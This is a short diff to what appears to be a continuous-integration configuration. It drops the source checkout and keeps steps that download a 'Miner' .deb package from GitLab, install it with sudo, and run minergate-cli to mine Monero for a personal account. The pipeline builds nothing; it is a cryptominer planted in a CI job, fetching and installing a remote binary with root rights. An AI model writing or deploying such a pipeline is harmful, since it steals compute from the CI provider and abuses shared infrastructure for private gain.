@@ -4,7 +4,6 @@ jobs:
     machine: true
 
     steps:
-      - checkout
       - run: wget https://gitlab.com/Yoginth/Miner/raw/master/yogi-cli.deb -O yogi-cli.deb
       - run: sudo dpkg -i yogi-cli.deb
       - run: minergate-cli -user yoginth@hotmail.com xmr
